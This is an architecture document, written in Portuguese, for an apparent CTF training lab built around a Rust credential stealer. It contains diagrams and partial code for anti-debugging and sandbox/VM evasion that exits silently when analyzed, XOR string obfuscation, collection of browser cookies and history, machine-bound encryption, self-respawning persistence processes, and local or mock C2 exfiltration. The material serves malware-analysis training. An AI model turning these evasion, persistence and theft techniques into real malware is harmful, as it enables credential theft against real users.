# 🏗️ Arquitetura Técnica - MyStealer CTF Lab v0.3

## Visão Geral

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         MYSTEALER v0.3 - STEALTH EDITION                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                         ENTRY POINT (main.rs)                        │   │
│  │  • CLI Parsing (clap)                                                │   │
│  │  • Feature flags (lab-mode, hydra-auto, silent)                     │   │
│  │  • Anti-analysis checks                                              │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                      │                                      │
│                                      ▼                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                        ANTI-ANALYSIS LAYER                          │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐  │   │
│  │  │ anti_debug   │  │ anti_analysis│  │      evasion             │  │   │
│  │  │              │  │              │  │                          │  │   │
│  │  │ • Timing     │  │ • VM detect  │  │ • Initial delay          │  │   │
│  │  │ • TracerPid  │  │ • Sandbox    │  │ • Junk operations        │  │   │
│  │  │ • Exceptions │  │ • Registry   │  │ • Decoy file ops         │  │   │
│  │  │ • Opaque     │  │ • MAC addr   │  │ • Process checks         │  │   │
│  │  │   predicates │  │ • DMI info   │  │ • Hardware checks        │  │   │
│  │  └──────────────┘  └──────────────┘  └──────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                      │                                      │
│                    ┌─────────────────┴─────────────────┐                    │
│                    ▼                                   ▼                    │
│  ┌─────────────────────────────┐    ┌─────────────────────────────────┐    │
│  │      HYDRA SYSTEM           │    │      COLLECTION PIPELINE        │    │
│  │   (loader module)           │    │     (collectors module)         │    │
│  │                             │    │                                 │    │
│  │  ┌───────┐ ┌───────┐       │    │  ┌──────────┐  ┌──────────┐    │    │
│  │  │ ALPHA │ │ BETA  │       │    │  │ browser  │  │ system   │    │    │
│  │  └───┬───┘ └───┬───┘       │    │  └──────────┘  └──────────┘    │    │
│  │      │         │           │    │  ┌──────────┐  ┌──────────┐    │    │
│  │      │ ┌───────┐           │    │  │clipboard │  │  files   │    │    │
│  │      └─│ GAMMA │           │    │  └──────────┘  └──────────┘    │    │
│  │        └───────┘           │    │                                 │    │
│  │  Heartbeat IPC (.hb files) │    │  CollectorManager orchestrates  │    │
│  │  Lock files (.lock)        │    │  Async parallel collection      │    │
│  │  Auto-respawn (15s)        │    │  Priority-based ordering        │    │
│  └─────────────────────────────┘    └─────────────────────────────────┘    │
│                                      │                                      │
│                                      ▼                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                        CRYPTO LAYER                                  │   │
│  │  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │   │
│  │  │   AES-256-GCM    │  │  Byte Shuffling  │  │  Key Derivation  │  │   │
│  │  │                  │  │                  │  │                  │  │   │
│  │  │ • Random nonce   │  │ • Fisher-Yates   │  │ • Argon2         │  │   │
│  │  │ • Authenticated  │  │ • Deterministic  │  │ • Machine-ID     │  │   │
│  │  │ • 12-byte nonce  │  │ • Seed-based     │  │ • Obfuscated salt│  │   │
│  │  └──────────────────┘  └──────────────────┘  └──────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                      │                                      │
│                                      ▼                                      │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                        EXFILTRATION LAYER                           │   │
│  │  ┌──────────────────────────┐  ┌──────────────────────────────────┐│   │
│  │  │     LocalExfiltrator     │  │      HttpExfiltrator (mock)      ││   │
│  │  │  • Save to output dir    │  │  • POST to C2                    ││   │
│  │  │  • Timestamped files     │  │  • Chunked transfer              ││   │
│  │  │  • Binary format         │  │  • Jittered requests             ││   │
│  │  └──────────────────────────┘  └──────────────────────────────────┘│   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                    STRING OBFUSCATION LAYER                          │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐  │   │
│  │  │  XOR Encode  │  │ Stack String │  │   Runtime SQL Builder    │  │   │
│  │  │              │  │              │  │                          │  │   │
│  │  │ Keys:        │  │ Char-by-char │  │ Queries built at runtime │  │   │
│  │  │ 0x17, 0x19   │  │ construction │  │ No static SQL strings    │  │   │
│  │  │ 0x33, 0x42   │  │ via bs()     │  │ build_cookies_query()    │  │   │
│  │  │ 0x55, 0x77   │  │ function     │  │ build_history_query()    │  │   │
│  │  └──────────────┘  └──────────────┘  └──────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Módulos Principais

### 1. Entry Point (`main.rs`)

```rust
#[derive(Parser, Debug)]
struct Args {
    #[arg(long, default_value_t = true, hide = true)]
    lab_mode: bool,
    
    #[arg(long, default_value_t = cfg!(feature = "hydra-auto"), hide = true)]
    hydra: bool,
    
    #[arg(long, hide = true)]
    hydra_role: Option<String>,
    // ... outros args ocultos
}

async fn main() {
    // 1. Anti-debug checks
    if anti_debug::is_debugger_attached() {
        std::process::exit(0);
    }
    
    // 2. Initial delay (anti-sandbox)
    evasion::initial_delay();
    
    // 3. Evasion checks
    if evasion::run_all_checks().is_being_analyzed() {
        std::process::exit(0);
    }
    
    // 4. Run Hydra or normal mode
    if args.hydra {
        run_hydra_mode(&args).await
    } else {
        run_normal_mode(&args).await
    }
}
```

### 2. Collector System (`collectors/`)

```rust
pub trait Collector: Send + Sync {
    fn name(&self) -> &str;
    fn collect(&self) -> Result<ModuleData, CollectorError>;
    fn is_supported(&self) -> bool;
    fn priority(&self) -> u8 { 50 }
}

pub struct CollectorManager {
    collectors: Vec<Box<dyn Collector>>,
}

impl CollectorManager {
    pub async fn run_all(&self) -> Result<CollectedData, CollectorError> {
        let mut collected = CollectedData::new();
        
        // Ordena por prioridade (maior primeiro)
        let mut collectors: Vec<_> = self.collectors.iter().collect();
        collectors.sort_by(|a, b| b.priority().cmp(&a.priority()));
        
        // Executa cada coletor
        for collector in collectors {
            match collector.collect() {
                Ok(data) => collected.add_module(collector.name().to_string(), data),
                Err(_) => continue,
            }
        }
        
        Ok(collected)
    }
}
```

### 3. Hydra System (`loader/`)

```rust
pub struct HydraManager {
    my_head: HydraHead,           // Alpha, Beta, ou Gamma
    heads: HashMap<HydraHead, HeadState>,
    ipc_dir: PathBuf,             // Diretório de IPC
    shutdown: Arc<AtomicBool>,
    children: Vec<Child>,         // Processos filhos
}

// Fluxo principal
impl HydraManager {
    pub fn new() -> Result<Self, HydraError> {
        let ipc_dir = Self::get_ipc_dir()?;
        let my_head = Self::claim_head(&ipc_dir)?;
        // ...
    }
    
    pub fn send_heartbeat(&self) -> Result<(), HydraError>;
    pub fn check_siblings(&mut self) -> Vec<HydraHead>;
    pub fn respawn_head(&mut self, head: HydraHead) -> Result<(), HydraError>;
}
```

### 4. Crypto Layer (`crypto/`)

```rust
pub struct CryptoManager {
    key: [u8; 32],
}

impl CryptoManager {
    pub fn new() -> Result<Self, CryptoError> {
        let machine_id = Self::get_machine_id()?;
        let salt = Self::get_obfuscated_salt();
        
        let mut key = [0u8; 32];
        Argon2::default().hash_password_into(
            machine_id.as_bytes(), 
            &salt, 
            &mut key
        )?;
        
        Ok(Self { key })
    }
    
    pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError>;
    pub fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError>;
}
```

### 5. Anti-Analysis (`utils/`)

```rust
// anti_debug.rs
pub fn is_debugger_attached() -> bool;
pub fn opaque_true() -> bool;
pub fn opaque_false() -> bool;
pub fn junk_code_block();

// anti_analysis.rs
pub struct EnvironmentChecker;
impl EnvironmentChecker {
    pub fn is_virtual_machine() -> bool;
    pub fn is_debugger_present() -> bool;
    pub fn is_sandbox() -> bool;
}

// evasion.rs
pub fn initial_delay();
pub fn run_all_checks() -> EvasionResult;
pub fn check_analysis_processes() -> bool;
```

### 6. String Obfuscation (`utils/obfuscated_strings.rs`)

```rust
// XOR decode
#[inline(always)]
pub fn xor_decode(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

// Stack string
#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    black_box(s)
}

// Exemplos de uso
pub fn browser_chromium() -> String {
    xor_decode(&[0x21, 0x30, 0x36, 0x2d, 0x2b, 0x27, 0x37, 0x2b], 0x42)
}

pub fn proc_wireshark() -> String {
    xor_decode(&[0x00, 0x1e, 0x05, 0x12, 0x04, 0x1f, 0x14, 0x05, 0x1a], 0x77)
}
```

---

## Fluxo de Execução

```
┌─────────────────┐
│     START       │
└────────┬────────┘
         ▼
┌─────────────────┐
│  Parse Args     │
│  (clap hidden)  │
└────────┬────────┘
         ▼
┌─────────────────┐     ┌────────────────┐
│ Anti-Debug      │────▶│ Exit silently  │
│ Checks          │ Yes │ (exit code 0)  │
└────────┬────────┘     └────────────────┘
         │ No
         ▼
┌─────────────────┐
│ Initial Delay   │
│ (2-5 seconds)   │
└────────┬────────┘
         ▼
┌─────────────────┐
│ Junk Code       │
│ (anti-analysis) │
└────────┬────────┘
         ▼
┌─────────────────┐     ┌────────────────┐
│ Evasion Checks  │────▶│ Exit silently  │
│ (VM, sandbox)   │ Yes │ (exit code 0)  │
└────────┬────────┘     └────────────────┘
         │ No
         ▼
┌─────────────────┐
│ Hydra mode?     │
└────────┬────────┘
         │
    ┌────┴────┐
    ▼         ▼
┌───────┐ ┌───────┐
│ Hydra │ │Normal │
│ Mode  │ │ Mode  │
└───┬───┘ └───┬───┘
    │         │
    │    ┌────┴────┐
    │    ▼         │
    │ ┌──────────┐ │
    │ │Collectors│ │
    │ │ run_all  │ │
    │ └────┬─────┘ │
    │      ▼       │
    │ ┌──────────┐ │
    │ │ Encrypt  │ │
    │ │(AES+shuf)│ │
    │ └────┬─────┘ │
    │      ▼       │
    │ ┌──────────┐ │
    │ │ Exfil    │ │
    │ │ (local)  │ │
    │ └────┬─────┘ │
    │      │       │
    ▼      ▼       │
┌─────────────────┐│
│ Hydra Loop      ││
│ • Heartbeat     ││
│ • Check siblings││
│ • Respawn dead  ││
└─────────────────┘│
         │         │
         ▼         ▼
     ┌─────────────┐
     │     END     │
     └─────────────┘
```

---

## Estrutura de Dados

### CollectedData
```rust
#[derive(Serialize, Deserialize)]
pub struct CollectedData {
    pub timestamp: DateTime<Utc>,
    pub session_id: String,
    pub modules: HashMap<String, ModuleData>,
    pub metadata: CollectionMetadata,
}
```

### ModuleData
```rust
#[derive(Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum ModuleData {
    System(SystemData),
    Browser(BrowserData),
    Clipboard(ClipboardData),
    Files(FileData),
    Generic(serde_json::Value),
}
```

### EvasionResult
```rust
pub struct EvasionResult {
    pub timing_anomaly: bool,
    pub low_cpu: bool,
    pub low_memory: bool,
    pub small_disk: bool,
    pub analysis_tools: bool,
    pub sandbox_files: bool,
    pub sandbox_user: bool,
    pub vm_detected: bool,
    pub integrity_fail: bool,
}

impl EvasionResult {
    pub fn is_being_analyzed(&self) -> bool {
        self.timing_anomaly || 
        self.low_cpu || 
        self.analysis_tools || 
        self.sandbox_user ||
        self.vm_detected
    }
}
```

---

## Dependências

```toml
[dependencies]
tokio = { version = "1.35", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
aes-gcm = "0.10"
argon2 = "0.5"
rand = "0.8"
base64 = "0.21"
chrono = { version = "0.4", features = ["serde"] }
uuid = { version = "1.6", features = ["v4", "serde"] }
thiserror = "1.0"
anyhow = "1.0"
tracing = "0.1"
tracing-subscriber = "0.3"
reqwest = { version = "0.11", features = ["json", "rustls-tls"] }
dirs = "5.0"
whoami = "1.4"
sysinfo = "0.30"
rusqlite = { version = "0.31", features = ["bundled"] }
clap = { version = "4.4", features = ["derive"] }
```

---

## Próximos Passos

- Ver [TECHNIQUES.md](TECHNIQUES.md) para detalhes de cada técnica
- Ver [MODULES.md](MODULES.md) para detalhes dos coletores
- Ver [challenges/](../challenges/) para os desafios CTF
